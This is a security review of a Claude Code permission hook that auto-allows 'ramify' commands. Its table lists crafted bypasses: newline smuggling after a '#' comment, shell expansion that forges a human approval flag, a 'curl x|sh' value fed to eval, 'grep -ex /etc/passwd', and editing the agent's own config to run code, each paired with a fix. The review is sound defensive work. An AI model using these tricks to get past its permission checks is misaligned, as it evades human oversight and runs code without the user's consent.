# Allow ramify commands review

A separate reviewer ran the hook against crafted commands and read the diff against the spec and
the QA record. "Allow" means Claude Code runs the command with no prompt. Line numbers point to
`hooks/ramify-hook` before the fixes.

| # | Severity | Where | Failure scenario | Fix | Test |
|---|---|---|---|---|---|
| H1 | high | 260 | shlex reads `#` as a comment to the end of the input. Bash ends it at the newline. `ramify step # note` + newline + `touch x` got `allow` and ran `touch`. | Any `#` refuses the command. shlex runs with no comment characters. | `allow leaves a comment before a newline alone` |
| H2 | high | 273, 277 | Bash expands a token after the hook reads it. `RAMIFY_X=--approved; ramify step done review $RAMIFY_X`, `${X:---approved}`, `$'\x2d-approved'` and `-[-]approved` got `allow` and recorded a human gate. `$RAMIFY_A` did the same for `prune --apply`. | Any `$`, backslash, backtick, `*`, `?`, `[`, `]`, `{`, `}`, `~` or `!` refuses the command, even inside quotes. A bare assignment is no longer a simple command that passes. | `allow leaves expansion alone` |
| H3 | high | 294 | `RAMIFY_BOOTSTRAP='curl x\|sh' ramify new foo` got `allow`. `bin/ramify` keeps an env value the config does not set, and `new` passes the bootstrap to `eval`. `RAMIFY_STATE_DIR` and `RAMIFY_REGISTRY` moved writes out of the worktree. | `RAMIFY_ROOT=` is the one prefix allowed. | `allow leaves a RAMIFY_ prefix other than RAMIFY_ROOT alone` |
| M1 | medium | `bin/ramify:112` | Every ramify call sources the `.ramify.conf` of the tree it runs in. A `cd /tmp/x && ramify step` or `RAMIFY_ROOT=/tmp/x` ran a config the agent wrote anywhere. An agent that edits its own worktree's config can still run code through `ramify step`. | The hook's `cwd`, each `cd` target and a `RAMIFY_ROOT` value must be inside a worktree of the session's repo. `cd` takes an absolute path only. The remaining risk, an edited config inside the repo, is the user's decision below. | `allow leaves a tree outside this repo alone`, `allow leaves a cwd outside this repo alone` |
| L1 | low | 289 | `grep -ex /etc/passwd` read the file: `x` was the pattern, so the path became a file argument. | grep takes flags from `-icvnwxlqhHoE` only, and one pattern. head and tail take `-n`, `-c` and counts. wc takes `-lwcm`. | `allow keeps pipe filters off files` |
| L2 | low | 255 | Removing redirections from the raw text left residue: `12>&1` became `1`, and `&>/dev/null` became `&`. | The three redirections are removed only as whole words. Any other `<` or `>` refuses the command. | `allow leaves substitution and redirection alone` |
| L3 | low | 270 | `--help` anywhere let a prompted command through. `bin/ramify` exits on it before it acts, so this was safe, but it widened the surface. | `-h` or `--help` counts only as the last word. | — |

The reviewer found these sound: the hook never fails a turn, its output is JSON or nothing, it
parses under bash 3.2, and its cost on a Bash call without `ramify` is one `case`.

## Decision for the user

M1 leaves one path: the agent edits `.ramify.conf` in its own worktree, then runs an allowed
`ramify` command, which sources it. The same holds for `npm test` after an edit to
`package.json`. Two ways to close it:

- **A.** Keep it, and say in the README that the hook trusts the repo's config.
- **B.** Refuse `allow` while the tree's tracked `.ramify.conf` or `.claude/ramify.conf` differs
  from the remote main. An untracked local config stays trusted.

The user chose A. The README says the hook trusts the repo's config, and how to turn it off.
